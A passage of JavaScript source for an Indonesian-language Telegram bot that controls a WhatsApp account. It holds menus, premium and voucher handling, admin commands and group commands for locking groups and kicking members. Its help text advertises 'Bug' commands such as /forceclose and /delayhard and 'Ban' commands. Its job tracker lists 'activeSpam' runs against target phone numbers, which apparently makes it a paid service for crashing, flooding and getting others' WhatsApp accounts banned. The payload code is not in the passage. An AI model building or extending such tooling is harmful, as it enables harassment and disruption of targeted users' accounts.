  <li><code>/gadmin LINK</code> — List admin</li>
  <li><code>/gmember LINK</code> — List member</li>
  <li><code>/ginvite LINK</code> — Get invite link</li>
  <li><code>/glock LINK</code> — Lock grup</li>
  <li><code>/gunlock LINK</code> — Unlock grup</li>
  <li><code>/gkick LINK 628xxxx</code> — Kick member</li>
</ul>
<hr/>
<p><i>Atau klik tombol di bawah, bot bakal minta link grup.</i></p>
`.trim();
  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
      reply_markup: { inline_keyboard: GROUP_KEYBOARD },
    });
  } catch (e) {}
});

function askGroupLink(label, actionKey) {
  return async (ctx) => {
    const userId = ctx.from.id;
    pendingGroupAsk.set(userId, actionKey);
    await ctx.answerCbQuery(`Kirim link grup buat ${label}`);
    await ctx.telegram.sendMessage(ctx.chat.id,
      `📥 <b>${label}</b>\n\nKirim <b>link grup WA</b> atau <b>ID grup</b>.\nContoh: <code>https://chat.whatsapp.com/xxxxx</code>`,
      { parse_mode: "HTML" }
    ).catch(() => {});
  };
}
bot.action("/ginfo_btn",   askGroupLink("Info Grup", "info"));
bot.action("/gadmin_btn",  askGroupLink("List Admin", "admin"));
bot.action("/gmember_btn", askGroupLink("List Member", "member"));
bot.action("/ginvite_btn", askGroupLink("Invite Link", "invite"));
bot.action("/glock_btn",   askGroupLink("Lock Grup", "lock"));
bot.action("/gunlock_btn", askGroupLink("Unlock Grup", "unlock"));

// =====================================================
// ============ MEMBER MENU ============================
// =====================================================
const MEMBER_KEYBOARD = [
  [
    { text: "My Premium", callback_data: "/mypremium_cmd", style: "primary" },
    { text: "My Job", callback_data: "/myjob_cmd", style: "success" },
  ],
  [
    { text: "Limit", callback_data: "/limit_cmd", style: "primary" },
    { text: "Daily", callback_data: "/daily_cmd", style: "success" },
  ],
  [
    { text: "Referral", callback_data: "/myreferral_cmd", style: "primary" },
    { text: "Coin", callback_data: "/coin_cmd", style: "success" },
  ],
  [
    { text: "Ping", callback_data: "/ping_cmd", style: "primary" },
    { text: "Help", callback_data: "/help_cmd", style: "success" },
  ],
  [
    { text: "Back", callback_data: "/setting_menu", style: "danger" },
    { text: "Home", callback_data: "/start", style: "primary" },
  ],
];

bot.action("/member_menu", async (ctx) => {
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;
  const html = `
<h2>👤 Member Menu</h2>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<ul>
  <li>/mypremium — Cek premium</li>
  <li>/myjob — Job aktif</li>
  <li>/limit — Limit harian</li>
  <li>/daily — Klaim harian</li>
  <li>/redeem KODE — Tukar voucher</li>
  <li>/myreferral — Kode referral</li>
  <li>/coin — Cek coin</li>
  <li>/ping — Latency</li>
  <li>/saran pesan — Saran</li>
  <li>/report pesan — Lapor bug</li>
</ul>
`.trim();
  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
      reply_markup: { inline_keyboard: MEMBER_KEYBOARD },
    });
  } catch (e) {}
});

bot.action("/mypremium_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isPremiumUser(ctx.from.id)) return ctx.reply("💤 Bukan premium. Pakai /redeem KODE.");
  ctx.reply(`👑 <b>PREMIUM</b>\n\n📅 Expired: <b>${getPremExpired(ctx.from.id)}</b>\n⏳ Sisa: <b>${sisaHariPremium(ctx.from.id)} hari</b>`, { parse_mode: "HTML" });
});
bot.action("/myjob_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  const userId = ctx.from.id.toString();
  const jobs = [...activeSpam.entries()].filter(([, s]) => s.userId === userId);
  if (!jobs.length) return ctx.reply("📌 Gak ada job aktif.");
  const lines = jobs.map(([jobId, s]) => {
    const durasi = Math.floor((Date.now() - s.startAt) / 1000);
    return `🆔 <code>${jobId}</code>\n🎯 ${s.target.split("@")[0]}\n⚙️ ${s.label}\n🔄 ${s.iterasi} | ✅ ${s.stats.ok} ❌ ${s.stats.fail}\n⏱ ${durasi}s`;
  }).join("\n\n");
  ctx.reply(`📊 <b>JOB AKTIF</b>\n\n${lines}`, { parse_mode: "HTML" });
});
bot.action("/limit_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (isPremiumUser(ctx.from.id)) return ctx.reply("👑 Premium — unlimited!");
  const u = getUserLimit(ctx.from.id);
  const sisa = Math.max(0, u.max - u.used);
  const bar = "█".repeat(u.used) + "░".repeat(Math.max(0, u.max - u.used));
  ctx.reply(`📊 <b>LIMIT</b>\n\n[${bar}]\n✅ Terpakai: <b>${u.used}</b>\n🟢 Sisa: <b>${sisa}</b>`, { parse_mode: "HTML" });
});
bot.action("/daily_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  const ok = checkDaily(ctx.from.id);
  if (!ok) return ctx.reply("📌 Udah klaim hari ini.");
  givePointDaily(ctx.from);
  addCoin(ctx.from.id, 5);
  ctx.reply("🎁 <b>DAILY CLAIM</b>\n\n✅ +5 Point\n✅ +5 Coin", { parse_mode: "HTML" });
});
bot.action("/myreferral_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  const code = getMyRefCode(ctx.from.id);
  const refs = getReferral(ctx.from.id);
  const botInfo = await bot.telegram.getMe().catch(() => null);
  const link = botInfo ? `https://t.me/${botInfo.username}?start=${code}` : "-";
  ctx.reply(`🔗 <b>REFERRAL</b>\n\n📌 <code>${code}</code>\n🔗 ${link}\n👥 Total: <b>${refs.length}</b>`, { parse_mode: "HTML" });
});
bot.action("/coin_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.reply(`🪙 <b>COIN</b>\n\n💰 <b>${getCoin(ctx.from.id)}</b>`, { parse_mode: "HTML" });
});
bot.action("/ping_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  const t1 = Date.now();
  const m = await ctx.reply("🏓 Pinging...");
  const t2 = Date.now();
  ctx.telegram.editMessageText(ctx.chat.id, m.message_id, undefined, `🏓 <b>Pong!</b> ${t2 - t1}ms | <b>${isWhatsAppConnected ? "Online" : "Offline"}</b>`, { parse_mode: "HTML" });
});
bot.action("/help_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  const html = `
<h1>📖 Help</h1>
<hr/>
<h2>🐛 Bug</h2>
<p>/bug, /delayhard, /ghost, /forceclose, /forcezz, /xdios, /stopbug</p>
<h2>🔥 Ban</h2>
<p>/endgbv1, /endgbv2</p>
<h2>👤 Member</h2>
<p>/mypremium /myjob /limit /daily /redeem /myreferral /coin /ping /saran /report</p>
<h2>👥 Grup</h2>
<p>/ginfo /gadmin /gmember /ginvite /glock /gunlock /gkick</p>
`.trim();
  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } }); }
  catch { await ctx.reply("📖 Ketik /help", { parse_mode: "Markdown" }); }
});

// =====================================================
// ============ ADMIN MENU =============================
// =====================================================
const ADMIN_KEYBOARD = [
  [
    { text: "Broadcast", callback_data: "/broadcast_cmd", style: "primary" },
    { text: "List User", callback_data: "/listuser_cmd", style: "success" },
  ],
  [
    { text: "List Ban", callback_data: "/listban_cmd", style: "danger" },
    { text: "Whitelist", callback_data: "/whitelist_cmd", style: "primary" },
  ],
  [
    { text: "Stats", callback_data: "/stats_cmd", style: "success" },
    { text: "Logs", callback_data: "/logs_cmd", style: "primary" },
  ],
  [
    { text: "Maintenance", callback_data: "/maintenance_cmd", style: "danger" },
    { text: "Backup", callback_data: "/autobackup_cmd", style: "primary" },
  ],
  [
    { text: "Voucher", callback_data: "/voucher_cmd", style: "success" },
    { text: "Sysinfo", callback_data: "/sysinfo_cmd", style: "primary" },
  ],
  [
    { text: "Back", callback_data: "/setting_menu", style: "danger" },
    { text: "Home", callback_data: "/start", style: "primary" },
  ],
];

bot.action("/admin_menu", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.answerCbQuery("❌ Khusus owner", { show_alert: true });
  await ctx.answerCbQuery();
  const msgId = ctx.callbackQuery.message.message_id;
  const html = `
<h2>🛡 Admin Menu</h2>
<img src="${thumbnailUrl}" alt="banner"/>
<hr/>
<ul>
  <li>/broadcast pesan</li>
  <li>/ban 12345678 | /unban 12345678</li>
  <li>/listuser | /listban</li>
  <li>/setlimit 12345678 10 | /resetlimit</li>
  <li>/whitelist add|del|list</li>
  <li>/maintenance on|off</li>
  <li>/autobackup on|off</li>
  <li>/logs</li>
  <li>/voucher create 30 10</li>
  <li>/restart | /killsession</li>
</ul>
`.trim();
  try {
    await ctx.telegram.callApi("editMessageText", {
      chat_id: ctx.chat.id, message_id: msgId, rich_message: { html },
      reply_markup: { inline_keyboard: ADMIN_KEYBOARD },
    });
  } catch (e) {}
});

bot.action("/broadcast_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isOwner(ctx.from.id)) return;
  ctx.reply("📢 Ketik: <code>/broadcast pesan kamu</code>", { parse_mode: "HTML" });
});
bot.action("/listuser_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isOwner(ctx.from.id)) return;
  const users = Object.values(getAllUsers());
  if (!users.length) return ctx.reply("📭 Belum ada user.");
  const top = users.slice(0, 30).map((u, i) => `${i + 1}. ${esc(u.name || "User")} — ${u.premium ? "Premium" : "Free"}`).join("\n");
  ctx.reply(`👥 <b>USER</b> (${users.length})\n\n${top}`, { parse_mode: "HTML" });
});
bot.action("/listban_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isOwner(ctx.from.id)) return;
  const b = Object.entries(getAllBanned());
  if (!b.length) return ctx.reply("📭 Gak ada banned.");
  const txt = b.map(([id, v], i) => `${i + 1}. <code>${id}</code> — ${esc(v.reason || "-")}`).join("\n");
  ctx.reply(`🚫 <b>BANNED</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.action("/whitelist_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isOwner(ctx.from.id)) return;
  const w = loadWhitelist();
  if (!w.list.length) return ctx.reply("🛡 Whitelist kosong.\n\nPakai: /whitelist add 628xxxx");
  ctx.reply(`🛡 <b>WHITELIST</b>\n\n${w.list.map((n, i) => `${i + 1}. <code>${n}</code>`).join("\n")}`, { parse_mode: "HTML" });
});
bot.action("/stats_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  const s = loadStats();
  const day = todayWIB();
  const today = s.per_day?.[day] || { bug: 0, ban: 0 };
  const totalIter = (s.total_iterasi_ok || 0) + (s.total_iterasi_fail || 0);
  const rate = totalIter > 0 ? ((s.total_iterasi_ok / totalIter) * 100).toFixed(1) : "0.0";
  ctx.reply(`📊 <b>STATS</b>\n\n🔥 Hari ini (${day})\n🐛 ${today.bug} | 🔥 ${today.ban}\n\n📈 Total\nJob: ${s.total_jobs || 0}\nIter OK: ${s.total_iterasi_ok || 0}\nIter Fail: ${s.total_iterasi_fail || 0}\nRate: ${rate}%`, { parse_mode: "HTML" });
});
bot.action("/logs_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isOwner(ctx.from.id)) return;
  const logs = getLogs(10);
  if (!logs.length) return ctx.reply("📭 Belum ada log.");
  const txt = logs.map((l, i) => `${i + 1}. [${l.type}] ${esc(l.msg)}`).join("\n");
  ctx.reply(`📜 <b>LOGS</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.action("/maintenance_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isOwner(ctx.from.id)) return;
  maintenanceMode = !maintenanceMode;
  saveSettings({ ...getSettings(), maintenance: maintenanceMode });
  ctx.reply(maintenanceMode ? "🔧 Maintenance ON" : "✅ Maintenance OFF");
});
bot.action("/autobackup_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isOwner(ctx.from.id)) return;
  autobackupEnabled = !autobackupEnabled;
  saveSettings({ ...getSettings(), autobackup: autobackupEnabled });
  if (autobackupEnabled && !autobackupInterval) {
    autobackupInterval = setInterval(async () => {
      try {
        const files = fs.readdirSync("./database").filter(f => f.endsWith(".json"));
        for (const f of files) await bot.telegram.sendDocument(ownerID, { source: `./database/${f}`, filename: f }).catch(() => {});
        await bot.telegram.sendMessage(ownerID, `📦 Autobackup: ${files.length} file dikirim.`);
      } catch {}
    }, 6 * 60 * 60 * 1000);
  } else if (!autobackupEnabled && autobackupInterval) {
    clearInterval(autobackupInterval); autobackupInterval = null;
  }
  ctx.reply(autobackupEnabled ? "📦 Autobackup ON" : "🛑 Autobackup OFF");
});
bot.action("/voucher_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  if (!isOwner(ctx.from.id)) return;
  const list = listVoucher();
  if (!list.length) return ctx.reply("🎫 Belum ada voucher.\n\nBikin: /voucher create 30 10");
  const txt = list.slice(0, 20).map((v, i) => `${i + 1}. <code>${v.code}</code> — ${v.days}h ${v.used ? "USED" : "READY"}`).join("\n");
  ctx.reply(`🎫 <b>VOUCHER</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.action("/sysinfo_cmd", async (ctx) => {
  await ctx.answerCbQuery();
  const mem = process.memoryUsage();
  ctx.reply(`🖥 <b>SYSINFO</b>\n\n💾 RAM: <code>${(mem.rss / 1024 / 1024).toFixed(0)} MB</code>\n🧠 Heap: <code>${(mem.heapUsed / 1024 / 1024).toFixed(0)} MB</code>\n📦 Node: <code>${process.version}</code>\n⏱ Uptime: <code>${formatUptimePretty()}</code>`, { parse_mode: "HTML" });
});

// =====================================================
// ============ COMMAND GRUP MANUAL ====================
// =====================================================
bot.command("ginfo", premGroupOnly(), async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("📌 /ginfo https://chat.whatsapp.com/xxxxx");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
  const groupJid = await resolveWaGroup(args);
  if (!groupJid) return ctx.reply("❌ Link gak valid.");
  const meta = await fetchGroupInfo(groupJid);
  if (!meta) return ctx.reply("❌ Gagal ambil info.");
  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: groupInfoHtml(meta) } }); }
  catch { await ctx.reply(`👥 ${esc(meta.subject)} — ${meta.participants.length} member`, { parse_mode: "Markdown" }); }
});
bot.command("gadmin", premGroupOnly(), async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("📌 /gadmin https://chat.whatsapp.com/xxxxx");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
  const groupJid = await resolveWaGroup(args);
  if (!groupJid) return ctx.reply("❌ Link gak valid.");
  const meta = await fetchGroupInfo(groupJid);
  if (!meta) return ctx.reply("❌ Gagal ambil info.");
  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: adminListHtml(meta) } }); }
  catch { await ctx.reply(`👑 Admin: ${meta.participants.filter(p=>p.admin).length}`, { parse_mode: "Markdown" }); }
});
bot.command("gmember", premGroupOnly(), async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("📌 /gmember https://chat.whatsapp.com/xxxxx");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
  const groupJid = await resolveWaGroup(args);
  if (!groupJid) return ctx.reply("❌ Link gak valid.");
  const meta = await fetchGroupInfo(groupJid);
  if (!meta) return ctx.reply("❌ Gagal ambil info.");
  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: memberListHtml(meta) } }); }
  catch { await ctx.reply(`👥 Member: ${meta.participants.length}`, { parse_mode: "Markdown" }); }
});
bot.command("ginvite", premGroupOnly(), async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("📌 /ginvite https://chat.whatsapp.com/xxxxx");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
  const groupJid = await resolveWaGroup(args);
  if (!groupJid) return ctx.reply("❌ Link gak valid.");
  try {
    const code = await sock.groupInviteCode(groupJid);
    await ctx.reply(`🔗 *INVITE LINK*\n\nhttps://chat.whatsapp.com/${code}`, { parse_mode: "Markdown" });
  } catch (e) { ctx.reply(`❌ ${e.message}`); }
});
bot.command("glock", premGroupOnly(), async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("📌 /glock https://chat.whatsapp.com/xxxxx");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
  const groupJid = await resolveWaGroup(args);
  if (!groupJid) return ctx.reply("❌ Link gak valid.");
  try { await sock.groupSettingsUpdate(groupJid, "announcement", true); await ctx.reply("🔒 Grup di-lock."); }
  catch (e) { ctx.reply(`❌ ${e.message}`); }
});
bot.command("gunlock", premGroupOnly(), async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("📌 /gunlock https://chat.whatsapp.com/xxxxx");
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
  const groupJid = await resolveWaGroup(args);
  if (!groupJid) return ctx.reply("❌ Link gak valid.");
  try { await sock.groupSettingsUpdate(groupJid, "announcement", false); await ctx.reply("🔓 Grup di-unlock."); }
  catch (e) { ctx.reply(`❌ ${e.message}`); }
});
bot.command("gkick", premGroupOnly(), async (ctx) => {
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2) return ctx.reply("📌 /gkick https://chat.whatsapp.com/xxxxx 628xxxxxxxx");
  const groupJid = await resolveWaGroup(args[0]);
  if (!groupJid) return ctx.reply("❌ Link gak valid.");
  const target = args[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  try {
    await sock.groupParticipantsUpdate(groupJid, [target], "remove");
    await ctx.reply(`✅ <code>${target.split("@")[0]}</code> di-kick.`, { parse_mode: "HTML" });
  } catch (e) { ctx.reply(`❌ ${e.message}`); }
});

// =====================================================
// ============ MEMBER COMMANDS ========================
// =====================================================
bot.command("mypremium", async (ctx) => {
  if (!isPremiumUser(ctx.from.id)) return ctx.reply("💤 Bukan premium. Pakai /redeem KODE.");
  ctx.reply(`👑 <b>PREMIUM</b>\n\n📅 Expired: <b>${getPremExpired(ctx.from.id)}</b>\n⏳ Sisa: <b>${sisaHariPremium(ctx.from.id)} hari</b>`, { parse_mode: "HTML" });
});
bot.command("myjob", async (ctx) => {
  const userId = ctx.from.id.toString();
  const jobs = [...activeSpam.entries()].filter(([, s]) => s.userId === userId);
  if (!jobs.length) return ctx.reply("📌 Gak ada job aktif.");
  const lines = jobs.map(([jobId, s]) => {
    const durasi = Math.floor((Date.now() - s.startAt) / 1000);
    return `🆔 <code>${jobId}</code>\n🎯 ${s.target.split("@")[0]}\n⚙️ ${s.label}\n🔄 ${s.iterasi} | ✅ ${s.stats.ok} ❌ ${s.stats.fail}\n⏱ ${durasi}s`;
  }).join("\n\n");
  ctx.reply(`📊 <b>JOB AKTIF</b>\n\n${lines}`, { parse_mode: "HTML" });
});
bot.command("limit", async (ctx) => {
  if (isPremiumUser(ctx.from.id)) return ctx.reply("👑 Premium — unlimited!");
  const u = getUserLimit(ctx.from.id);
  const sisa = Math.max(0, u.max - u.used);
  const bar = "█".repeat(u.used) + "░".repeat(Math.max(0, u.max - u.used));
  ctx.reply(`📊 <b>LIMIT</b>\n\n[${bar}]\n✅ Terpakai: <b>${u.used}</b>\n🟢 Sisa: <b>${sisa}</b>`, { parse_mode: "HTML" });
});
bot.command("daily", async (ctx) => {
  const ok = checkDaily(ctx.from.id);
  if (!ok) return ctx.reply("📌 Udah klaim hari ini.");
  givePointDaily(ctx.from);
  addCoin(ctx.from.id, 5);
  ctx.reply("🎁 <b>DAILY CLAIM</b>\n\n✅ +5 Point\n✅ +5 Coin", { parse_mode: "HTML" });
});
bot.command("redeem", async (ctx) => {
  const code = ctx.message.text.split(" ")[1];
  if (!code) return ctx.reply("📌 Format: /redeem KODE-VOUCHER");
  const res = redeemVoucher(code.toUpperCase(), ctx.from.id);
  if (!res.ok) return ctx.reply(`❌ ${res.msg}`);
  ctx.reply(`🎉 <b>VOUCHER BERHASIL!</b>\n\n⭐ +${res.days} hari premium\n📅 Expired: <b>${res.exp}</b>`, { parse_mode: "HTML" });
});
bot.command("myreferral", async (ctx) => {
  const code = getMyRefCode(ctx.from.id);
  const refs = getReferral(ctx.from.id);
  const botInfo = await bot.telegram.getMe().catch(() => null);
  const link = botInfo ? `https://t.me/${botInfo.username}?start=${code}` : "-";
  ctx.reply(`🔗 <b>REFERRAL</b>\n\n📌 <code>${code}</code>\n🔗 ${link}\n👥 Total: <b>${refs.length}</b>`, { parse_mode: "HTML" });
});
bot.command("coin", async (ctx) => {
  ctx.reply(`🪙 <b>COIN</b>\n\n💰 <b>${getCoin(ctx.from.id)}</b>`, { parse_mode: "HTML" });
});
bot.command("ping", async (ctx) => {
  const t1 = Date.now();
  const m = await ctx.reply("🏓 Pinging...");
  const t2 = Date.now();
  ctx.telegram.editMessageText(ctx.chat.id, m.message_id, undefined, `🏓 <b>Pong!</b> ${t2 - t1}ms | <b>${isWhatsAppConnected ? "Online" : "Offline"}</b>`, { parse_mode: "HTML" });
});
bot.command("saran", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) return ctx.reply("📌 Format: /saran pesan...");
  const user = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  bot.telegram.sendMessage(ownerID, `💡 <b>SARAN</b>\n\n👤 ${esc(user)} (<code>${ctx.from.id}</code>)\n\n${esc(text)}`, { parse_mode: "HTML" }).catch(() => {});
  ctx.reply("✅ Saran dikirim ke owner.");
});
bot.command("report", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) return ctx.reply("📌 Format: /report alasan...");
  const user = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
  bot.telegram.sendMessage(ownerID, `🚨 <b>REPORT</b>\n\n👤 ${esc(user)} (<code>${ctx.from.id}</code>)\n\n${esc(text)}`, { parse_mode: "HTML" }).catch(() => {});
  ctx.reply("✅ Laporan dikirim ke owner.");
});
bot.command("help", async (ctx) => {
  const html = `
<h1>📖 Help</h1>
<hr/>
<h2>🐛 Bug</h2>
<p>/bug, /delayhard, /ghost, /forceclose, /forcezz, /xdios, /stopbug</p>
<h2>🔥 Ban</h2>
<p>/endgbv1, /endgbv2</p>
<h2>👤 Member</h2>
<p>/mypremium /myjob /limit /daily /redeem /myreferral /coin /ping /saran /report</p>
<h2>👥 Grup</h2>
<p>/ginfo /gadmin /gmember /ginvite /glock /gunlock /gkick</p>
`.trim();
  try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html } }); }
  catch { await ctx.reply("📖 Ketik /help", { parse_mode: "Markdown" }); }
});

// =====================================================
// ============ ADMIN COMMANDS =========================
// =====================================================
bot.command("broadcast", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) return ctx.reply("📌 /broadcast pesan...");
  const users = getAllUsers();
  const uids = Object.keys(users);
  let ok = 0, fail = 0;
  const m = await ctx.reply(`📢 Broadcasting ke ${uids.length} user...`);
  for (const uid of uids) {
    try { await bot.telegram.sendMessage(uid, `📢 <b>BROADCAST</b>\n\n${esc(text)}`, { parse_mode: "HTML" }); ok++; }
    catch { fail++; }
    await sleep(50);
  }
  ctx.telegram.editMessageText(ctx.chat.id, m.message_id, undefined, `✅ Selesai. OK: ${ok}, Fail: ${fail}`);
});
bot.command("ban", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ").slice(1);
  const target = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id : args[0];
  if (!target) return ctx.reply("📌 /ban 12345678 atau reply user");
  banUser(target, args[1] || "-");
  ctx.reply(`✅ <code>${target}</code> dibanned.`, { parse_mode: "HTML" });
});
bot.command("unban", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ").slice(1);
  const target = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id : args[0];
  if (!target) return ctx.reply("📌 /unban 12345678 atau reply user");
  unbanUser(target);
  ctx.reply(`✅ <code>${target}</code> di-unban.`, { parse_mode: "HTML" });
});
bot.command("listuser", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const users = Object.values(getAllUsers());
  if (!users.length) return ctx.reply("📭 Belum ada user.");
  const top = users.slice(0, 30).map((u, i) => `${i + 1}. ${esc(u.name || "User")} — ${u.premium ? "Premium" : "Free"}`).join("\n");
  ctx.reply(`👥 <b>USER</b> (${users.length})\n\n${top}`, { parse_mode: "HTML" });
});
bot.command("listban", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const b = Object.entries(getAllBanned());
  if (!b.length) return ctx.reply("📭 Gak ada banned.");
  const txt = b.map(([id, v], i) => `${i + 1}. <code>${id}</code> — ${esc(v.reason || "-")}`).join("\n");
  ctx.reply(`🚫 <b>BANNED</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.command("setlimit", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2) return ctx.reply("📌 /setlimit 12345678 10");
  setUserLimit(args[0], parseInt(args[1]));
  ctx.reply(`✅ Limit <code>${args[0]}</code> diset ke ${args[1]}.`, { parse_mode: "HTML" });
});
bot.command("resetlimit", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  resetAllLimit();
  ctx.reply("✅ Semua limit di-reset.");
});
bot.command("whitelist", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ").slice(1);
  const sub = args[0];
  if (sub === "add") {
    if (!args[1]) return ctx.reply("📌 /whitelist add 628xxxx");
    addWhitelist(args[1]);
    ctx.reply(`✅ <code>${args[1]}</code> ditambah.`, { parse_mode: "HTML" });
  } else if (sub === "del") {
    if (!args[1]) return ctx.reply("📌 /whitelist del 628xxxx");
    delWhitelist(args[1]);
    ctx.reply(`🗑 <code>${args[1]}</code> dihapus.`, { parse_mode: "HTML" });
  } else if (sub === "list") {
    const w = loadWhitelist();
    if (!w.list.length) return ctx.reply("📭 Whitelist kosong.");
    ctx.reply(`🛡 <b>WHITELIST</b>\n\n${w.list.map((n, i) => `${i + 1}. <code>${n}</code>`).join("\n")}`, { parse_mode: "HTML" });
  } else {
    ctx.reply("📌 /whitelist add|del|list");
  }
});
bot.command("maintenance", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const arg = (ctx.message.text.split(" ")[1] || "").toLowerCase();
  if (arg === "on") { maintenanceMode = true; saveSettings({ ...getSettings(), maintenance: true }); ctx.reply("🔧 Maintenance ON"); }
  else if (arg === "off") { maintenanceMode = false; saveSettings({ ...getSettings(), maintenance: false }); ctx.reply("✅ Maintenance OFF"); }
  else ctx.reply("📌 /maintenance on|off");
});
bot.command("autobackup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const arg = (ctx.message.text.split(" ")[1] || "").toLowerCase();
  if (arg === "on") {
    autobackupEnabled = true; saveSettings({ ...getSettings(), autobackup: true });
    if (autobackupInterval) clearInterval(autobackupInterval);
    autobackupInterval = setInterval(async () => {
      try {
        const files = fs.readdirSync("./database").filter(f => f.endsWith(".json"));
        for (const f of files) await bot.telegram.sendDocument(ownerID, { source: `./database/${f}`, filename: f }).catch(() => {});
        await bot.telegram.sendMessage(ownerID, `📦 Autobackup: ${files.length} file`);
      } catch {}
    }, 6 * 60 * 60 * 1000);
    ctx.reply("✅ Autobackup ON (tiap 6 jam).");
  } else if (arg === "off") {
    autobackupEnabled = false; saveSettings({ ...getSettings(), autobackup: false });
    if (autobackupInterval) { clearInterval(autobackupInterval); autobackupInterval = null; }
    ctx.reply("🛑 Autobackup OFF.");
  } else ctx.reply("📌 /autobackup on|off");
});
bot.command("logs", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const logs = getLogs(20);
  if (!logs.length) return ctx.reply("📭 Belum ada log.");
  const txt = logs.map((l, i) => `${i + 1}. [${l.type}] ${esc(l.msg)} — <i>${l.at}</i>`).join("\n");
  ctx.reply(`📜 <b>LOGS</b>\n\n${txt}`, { parse_mode: "HTML" });
});
bot.command("restart", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  await ctx.reply("🔄 Restarting...");
  setTimeout(() => process.exit(0), 1500);
});
bot.command("clearsession", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  try {
    if (fs.existsSync("./session")) fs.rmSync("./session", { recursive: true, force: true });
    ctx.reply("✅ Session WA dihapus. Restart bot buat re-pairing.");
  } catch (e) { ctx.reply(`❌ ${e.message}`); }
});
bot.command("voucher", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const args = ctx.message.text.split(" ").slice(1);
  const sub = args[0];
  if (sub === "create") {
    const days = parseInt(args[1]); const count = parseInt(args[2]);
    if (!days || !count) return ctx.reply("📌 /voucher create <hari> <jumlah>");
    const codes = createVoucher(days, count);
    ctx.reply(`✅ Voucher:\n\n${codes.map(c => `<code>${c}</code>`).join("\n")}`, { parse_mode: "HTML" });
